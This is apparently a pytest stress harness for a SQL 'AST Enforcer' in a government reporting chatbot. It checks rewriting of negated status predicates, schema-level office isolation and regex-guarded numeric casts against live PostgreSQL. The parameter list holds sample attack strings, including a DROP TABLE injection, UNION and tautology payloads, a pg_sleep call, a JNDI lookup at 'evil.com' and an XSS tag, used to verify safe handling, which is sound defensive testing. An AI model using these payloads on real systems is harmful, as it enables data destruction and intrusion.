"""
Module: IPGov_Chatbot/tests/test_challenger_prod_m2_r3_2_fuzzing.py
Chức năng: Empirical Challenger Stress Harness for Milestone 2 Iteration 3
Author: challenger_prod_m2_r3_2 (critic, specialist)

Target Objectives:
1. AST Enforcer Subquery & Negation Fuzzing:
   - Prove NOT EXISTS clauses are NEVER corrupted or replaced.
   - Prove direct negative predicates on outer status columns (!=, <>, NOT IN, NOT (...))
     are 100% transformed into positive equality report_status = 'approved'.
   - Fuzz nested queries with inner subqueries, correlated aliases, multi-level NOT EXISTS.
2. Multi-Schema Stress (dwh_public vs dwh_internal):
   - Prove ZERO office joins and ZERO office_id references on dwh_public even when user is role_level 2 with office_id.
   - Prove dwh_internal correctly applies office_id isolation for role_level 2.
   - Live PostgreSQL EXPLAIN on both schemas.
3. PostgreSQL Safe Numeric Regex Casting Boundary Verification:
   - Comprehensive edge-case and adversarial injection strings against live PostgreSQL 16.
   - AST Enforcer automatic transformation of unguarded casts.
"""

import pytest
import psycopg2
import sqlglot
import sqlglot.expressions as exp

from IPGov_Chatbot.config import settings
from IPGov_Chatbot.modules.mod03_router.canonical_normalizer import CanonicalSemanticNormalizer
from IPGov_Chatbot.modules.mod04_catalog.duckdb_semantic_catalog import DuckDBSemanticCatalog
from IPGov_Chatbot.modules.mod06_ast_enforcer.ast_enforcer_service import ASTEnforcerService
from IPGov_Chatbot.schemas.sql_compiler_schema import GeneratedSQLDTO, SQLExecutionMode
from IPGov_Chatbot.schemas.user_context import UserSecurityContextDTO


@pytest.fixture(scope="module")
def db_conn():
    """Establish direct connection to live PostgreSQL DWH with autocommit."""
    try:
        conn = psycopg2.connect(settings.sync_dwh_url, connect_timeout=5)
        conn.autocommit = True
        yield conn
        conn.close()
    except Exception as e:
        pytest.skip(f"Live PostgreSQL DWH not reachable at {settings.sync_dwh_url}: {e}")


@pytest.fixture(scope="module")
def shared_catalog():
    return DuckDBSemanticCatalog()


@pytest.fixture(scope="module")
def normalizer(shared_catalog):
    return CanonicalSemanticNormalizer(catalog=shared_catalog)


@pytest.fixture(scope="module")
def ast_enforcer():
    return ASTEnforcerService()


# ---------------------------------------------------------------------------
# OBJECTIVE 1: AST ENFORCER SUBQUERY & NEGATION FUZZING
# ---------------------------------------------------------------------------

class TestASTEnforcerSubqueryNegationFuzzing:
    """Fuzzing and adversarial stress on AST Enforcer subqueries and negations."""

    @pytest.mark.parametrize(
        "query_name,raw_sql,expected_not_exists_count",
        [
            (
                "single_correlated_not_exists",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id
                        AND w.report_status = 'approved'
                  )
                """,
                1,
            ),
            (
                "multi_level_nested_not_exists",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id
                        AND NOT EXISTS (
                            SELECT 1 FROM dwh_internal.fact_report_criteria z
                            WHERE z.criteria_id = w.criteria_id AND z.report_status = 'approved'
                        )
                  )
                """,
                2,
            ),
            (
                "parallel_dual_not_exists",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id AND w.report_status = 'approved'
                  )
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria k
                      WHERE k.code = f.code AND k.year_code = '2025'
                  )
                """,
                2,
            ),
            (
                "not_exists_with_outer_negative_status",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND f.report_status != 'approved'
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id AND w.report_status = 'approved'
                  )
                """,
                1,
            ),
            (
                "not_exists_with_outer_not_in_status",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND f.report_status NOT IN ('approved', 'rejected')
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id
                  )
                """,
                1,
            ),
            (
                "not_exists_with_outer_not_paren_status",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND NOT (f.report_status = 'approved')
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id AND w.report_status = 'approved'
                  )
                """,
                1,
            ),
            (
                "not_exists_with_inner_negative_status",
                """
                SELECT f.criteria_id, f.value
                FROM dwh_internal.fact_report_criteria f
                WHERE f.tenant_code = '68'
                  AND NOT EXISTS (
                      SELECT 1 FROM dwh_internal.fact_report_criteria w
                      WHERE w.criteria_id = f.criteria_id AND w.report_status <> 'approved'
                  )
                """,
                1,
            ),
        ],
    )
    def test_not_exists_clauses_never_corrupted(
        self, ast_enforcer, db_conn, query_name, raw_sql, expected_not_exists_count
    ):
        """Verify NOT EXISTS subqueries are NEVER replaced by w.report_status = 'approved'
        and retain exact NOT EXISTS semantics while executing cleanly on PostgreSQL.
        """
        ctx = UserSecurityContextDTO(user_id="fuzz_tester", role_level=0, tenant_code="68")
        dto = GeneratedSQLDTO(
            raw_sql=raw_sql,
            execution_mode=SQLExecutionMode.SINGLE_UNIFIED,
            generator_track="TRACK_A_COMPILER",
        )
        res = ast_enforcer.enforce_sql_sync(dto, ctx)
        sanitized = res.sanitized_sql
        sanitized_lower = sanitized.lower()

        # 1. Assert NOT EXISTS preserved
        assert sanitized_lower.count("not exists") == expected_not_exists_count, (
            f"{query_name}: Expected {expected_not_exists_count} NOT EXISTS clauses, got {sanitized_lower.count('not exists')}\n"
            f"Sanitized SQL:\n{sanitized}"
        )

        # 2. Assert no orphan subquery aliases leaked to outer query
        parsed = sqlglot.parse_one(sanitized, read="postgres")
        # Ensure outer query has positive report_status = 'approved'
        assert "report_status = 'approved'" in sanitized_lower

        # 3. Assert zero negative bypasses in outer query
        assert "!= 'approved'" not in sanitized_lower
        assert "<> 'approved'" not in sanitized_lower
        assert "not in ('approved')" not in sanitized_lower

        # 4. Run live PostgreSQL EXPLAIN to guarantee execution safety
        cur = db_conn.cursor()
        try:
            cur.execute(f"EXPLAIN {sanitized}")
        except Exception as e:
            pytest.fail(f"PostgreSQL EXPLAIN failed on {query_name}: {e}\nSanitized SQL:\n{sanitized}")
        finally:
            cur.close()

    @pytest.mark.parametrize(
        "negative_where",
        [
            "f.report_status != 'approved'",
            "f.report_status <> 'approved'",
            "f.report_status NOT IN ('approved')",
            "f.report_status NOT IN ('approved', 'rejected', 'pending')",
            "NOT (f.report_status = 'approved')",
            "NOT (f.report_status = 'approved' AND f.year_code = '2026')",
            "(f.report_status != 'approved') AND (f.report_status <> 'draft')",
            "(f.report_status <> 'approved') OR (f.report_status != 'approved')",
            "NOT (f.report_status IN ('approved'))",
            "f.report_status = 'draft'",
            "f.report_status = 'pending'",
            "f.report_status = 'rejected'",
            "f.report_status IN ('draft', 'pending')",
        ],
    )
    def test_outer_status_predicates_100_percent_transformed_to_positive_equality(
        self, ast_enforcer, db_conn, negative_where
    ):
        """Verify that every variation of negative / draft / pending status predicate
        is 100% transformed into positive equality report_status = 'approved'.
        """
        raw_sql = f"""
            SELECT f.criteria_id, f.value
            FROM dwh_internal.fact_report_criteria f
            WHERE f.tenant_code = '68' AND {negative_where}
        """
        ctx = UserSecurityContextDTO(user_id="adversary", role_level=0, tenant_code="68")
        dto = GeneratedSQLDTO(
            raw_sql=raw_sql,
            execution_mode=SQLExecutionMode.SINGLE_UNIFIED,
            generator_track="TRACK_A_COMPILER",
        )
        res = ast_enforcer.enforce_sql_sync(dto, ctx)
        sanitized = res.sanitized_sql
        sanitized_lower = sanitized.lower()

        # 1. Positive equality MUST be present
        assert "report_status = 'approved'" in sanitized_lower, (
            f"Missing positive report_status = 'approved' in: {sanitized}"
        )

        # 2. Negative and non-approved literals MUST NOT be present
        assert "!= 'approved'" not in sanitized_lower
        assert "<> 'approved'" not in sanitized_lower
        assert "not in ('approved')" not in sanitized_lower
        assert "report_status = 'draft'" not in sanitized_lower
        assert "report_status = 'pending'" not in sanitized_lower
        assert "report_status = 'rejected'" not in sanitized_lower

        # 3. Live PostgreSQL EXPLAIN check
        cur = db_conn.cursor()
        try:
            cur.execute(f"EXPLAIN {sanitized}")
        except Exception as e:
            pytest.fail(f"PostgreSQL EXPLAIN failed on sanitized SQL: {e}\nSQL:\n{sanitized}")
        finally:
            cur.close()


# ---------------------------------------------------------------------------
# OBJECTIVE 2: MULTI-SCHEMA STRESS (dwh_public vs dwh_internal)
# ---------------------------------------------------------------------------

class TestMultiSchemaPublicVsInternalStress:
    """Empirical verification of schema isolation between dwh_public and dwh_internal."""

    def test_dwh_public_zero_office_joins_and_zero_office_columns_for_role_2(self, ast_enforcer, db_conn):
        """Crucial test: When a user with role_level=2 and office_id='phong_xaydung_uuid'
        queries dwh_public, the AST Enforcer MUST NOT inject f.office_id or office joins,
        because office table and f.office_id do NOT exist in dwh_public!
        """
        raw_sql = """
            SELECT f.criteria_id, f.value
            FROM dwh_public.fact_report_criteria f
            WHERE f.tenant_code = '68'
        """
        # User is Level 2 with office_id and department_code
        ctx = UserSecurityContextDTO(
            user_id="u_phong_01",
            username="truong_phong_public",
            tenant_code="68",
            department_code="68-1-01",
            office_id="3c9f3cb2-30b2-42ed-9fd0-35e6bce92ac4",
            role_level=2,
            schema="dwh_public",
        )
        dto = GeneratedSQLDTO(
            raw_sql=raw_sql,
            execution_mode=SQLExecutionMode.SINGLE_UNIFIED,
            generator_track="TRACK_A_COMPILER",
        )
        res = ast_enforcer.enforce_sql_sync(dto, ctx)
        sanitized = res.sanitized_sql
        sanitized_lower = sanitized.lower()

        # 1. Assert ZERO office joins or office_id columns
        assert "office" not in sanitized_lower, f"Forbidden 'office' detected in dwh_public query: {sanitized}"
        assert "office_id" not in sanitized_lower, f"Forbidden 'office_id' detected in dwh_public query: {sanitized}"

        # 2. Assert ZERO department_code injection on dwh_public (since dwh_public does not isolate by department)
        # Note: department_code is only on internal or when explicit
        assert "department_code = '68-1-01'" not in sanitized_lower, (
            f"Department isolation leaked into dwh_public: {sanitized}"
        )

        # 3. Run EXPLAIN on live PostgreSQL dwh_public
        cur = db_conn.cursor()
        try:
            cur.execute(f"EXPLAIN {sanitized}")
        except Exception as e:
            pytest.fail(f"PostgreSQL EXPLAIN failed on dwh_public query: {e}\nSQL:\n{sanitized}")
        finally:
            cur.close()

    def test_dwh_internal_injects_office_id_for_role_2(self, ast_enforcer, db_conn):
        """Contrast test: When the same role_level=2 user queries dwh_internal,
        f.office_id MUST be injected for department/office isolation.
        """
        raw_sql = """
            SELECT f.criteria_id, f.value
            FROM dwh_internal.fact_report_criteria f
            WHERE f.tenant_code = '68'
        """
        ctx = UserSecurityContextDTO(
            user_id="u_phong_01",
            username="truong_phong_internal",
            tenant_code="68",
            department_code="68-1-01",
            office_id="3c9f3cb2-30b2-42ed-9fd0-35e6bce92ac4",
            role_level=2,
            schema="dwh_internal",
        )
        dto = GeneratedSQLDTO(
            raw_sql=raw_sql,
            execution_mode=SQLExecutionMode.SINGLE_UNIFIED,
            generator_track="TRACK_A_COMPILER",
        )
        res = ast_enforcer.enforce_sql_sync(dto, ctx)
        sanitized = res.sanitized_sql
        sanitized_lower = sanitized.lower()

        # 1. Assert office_id and department_code ARE injected on dwh_internal
        assert "office_id = '3c9f3cb2-30b2-42ed-9fd0-35e6bce92ac4'" in sanitized_lower, (
            f"Expected office_id injection in dwh_internal: {sanitized}"
        )
        assert "department_code = '68-1-01'" in sanitized_lower, (
            f"Expected department_code injection in dwh_internal: {sanitized}"
        )

        # 2. Run EXPLAIN on live PostgreSQL dwh_internal
        cur = db_conn.cursor()
        try:
            cur.execute(f"EXPLAIN {sanitized}")
        except Exception as e:
            pytest.fail(f"PostgreSQL EXPLAIN failed on dwh_internal query: {e}\nSQL:\n{sanitized}")
        finally:
            cur.close()

    def test_dwh_public_all_canonical_templates_pass_explain(self, normalizer, db_conn):
        """Verify that multi-criteria queries targeting dwh_public have no office references
        and pass live PostgreSQL EXPLAIN.
        """
        cur = db_conn.cursor()
        test_queries = [
            "Số lượng trâu và số lượng bò ngày 16/10/2026",
            "Sản lượng muối và diện tích muối năm 2026",
            "Diện tích sản xuất muối ngày 31/07/2026",
            "Top 5 chỉ tiêu có giá trị cao nhất năm 2026",
        ]
        for q in test_queries:
            frame = normalizer.normalize_query(q, session_tenant="68", session_year="2026")
            sql = normalizer.compile_canonical_sql(frame, target_schema="dwh_public")
            if not sql:
                continue

            sql_lower = sql.lower()
            assert "office" not in sql_lower, f"Found 'office' in dwh_public query: {q}"
            assert "office_id" not in sql_lower, f"Found 'office_id' in dwh_public query: {q}"

            try:
                cur.execute(f"EXPLAIN {sql}")
            except Exception as e:
                pytest.fail(f"Live PostgreSQL EXPLAIN failed for query '{q}' on dwh_public: {e}\nSQL:\n{sql}")

        cur.close()


# ---------------------------------------------------------------------------
# OBJECTIVE 3: POSTGRESQL SAFE NUMERIC REGEX CASTING BOUNDARY
# ---------------------------------------------------------------------------

class TestSafeNumericRegexCastingBoundary:
    """Stress-testing the SSOT regex macro across extreme inputs on PostgreSQL 16."""

    SSOT_REGEX_MACRO = "CASE WHEN TRIM(%s) ~ '^-?[0-9]+(\\.[0-9]+)?$' THEN TRIM(%s)::numeric ELSE NULL END"

    @pytest.mark.parametrize(
        "val_input,expected_val",
        [
            # Legitimate integers
            ("0", 0.0),
            ("426", 426.0),
            ("170", 170.0),
            ("256", 256.0),
            ("-100", -100.0),
            ("  50  ", 50.0),  # leading/trailing spaces trimmed
            ("\t88\n", None),  # standard SQL TRIM only trims 0x20 spaces, tabs/newlines safely yield NULL
            # Legitimate decimals
            ("0.0", 0.0),
            ("0.000000", 0.0),
            ("123.456789", 123.456789),
            ("-0.999", -0.999),
            ("  -3.14159  ", -3.14159),
            # Arbitrary precision numbers
            ("99999999999999999999", 99999999999999999999.0),
            # Malformed decimals (MUST safely return NULL without error)
            (".5", None),
            ("5.", None),
            ("1.2.3", None),
            ("1..0", None),
            ("..5", None),
            # Alphanumeric and unit suffixes (MUST safely return NULL)
            ("10 tấn", None),
            ("256 con", None),
            ("170 kg", None),
            ("N/A", None),
            ("null", None),
            ("None", None),
            ("-", None),
            ("--", None),
            ("", None),
            ("   ", None),
            # Scientific notation / Hex / Binary (Postgres regex excludes them, returning NULL safely)
            ("1e5", None),
            ("2.5E-3", None),
            ("0x1A", None),
            ("0b101", None),
            # Adversarial SQL injection strings in value column (MUST safely return NULL)
            ("'; DROP TABLE fact_report_criteria; --", None),
            ("1 UNION SELECT null, null, null--", None),
            ("' OR '1'='1", None),
            ("1; SELECT pg_sleep(5);", None),
            ("${jndi:ldap://evil.com/x}", None),
            ("<script>alert(1)</script>", None),
            ("admin'--", None),
            ("1' AND 1=1--", None),
            ("1' OR '1'='1' --", None),
        ],
    )
    def test_live_postgres_regex_macro_stress(self, db_conn, val_input, expected_val):
        """Execute SSOT regex macro on PostgreSQL with parametrized inputs."""
        cur = db_conn.cursor()
        sql = f"SELECT {self.SSOT_REGEX_MACRO} AS res;"
        try:
            cur.execute(sql, (val_input, val_input))
            row = cur.fetchone()
            actual = row[0]
            if expected_val is None:
                assert actual is None, f"Expected NULL for {repr(val_input)}, got {actual}"
            else:
                assert actual is not None, f"Expected {expected_val} for {repr(val_input)}, got NULL"
                assert float(actual) == float(expected_val), f"Expected {expected_val}, got {actual}"
        except psycopg2.Error as e:
            pytest.fail(f"PostgreSQL raised exception on input {repr(val_input)}: {e}")
        finally:
            cur.close()

    def test_ast_enforcer_transforms_multiple_unguarded_numeric_casts(self, ast_enforcer):
        """Verify AST Enforcer identifies and wraps all arithmetic/aggregate operations on value."""
        raw_sql = """
            SELECT criteria_id,
                   SUM(f.value::numeric) AS total_val,
                   AVG(f.value::float) AS avg_val,
                   MAX(f.value::numeric) AS max_val
            FROM dwh_internal.fact_report_criteria f
            GROUP BY criteria_id
        """
        ctx = UserSecurityContextDTO(user_id="test_user", role_level=0, tenant_code="68")
        dto = GeneratedSQLDTO(
            raw_sql=raw_sql,
            execution_mode=SQLExecutionMode.SINGLE_UNIFIED,
            generator_track="TRACK_A_COMPILER",
        )
        res = ast_enforcer.enforce_sql_sync(dto, ctx)
        sanitized = res.sanitized_sql
        sanitized_lower = sanitized.lower()

        # Assert regex macro pattern is injected
        assert "~ '^-?[0-9]" in sanitized, f"Regex macro missing in sanitized SQL:\n{sanitized}"
        # Assert raw unsafe cast 'f.value::numeric' or 'f.value::float' is removed
        assert "f.value::numeric" not in sanitized_lower
        assert "f.value::float" not in sanitized_lower
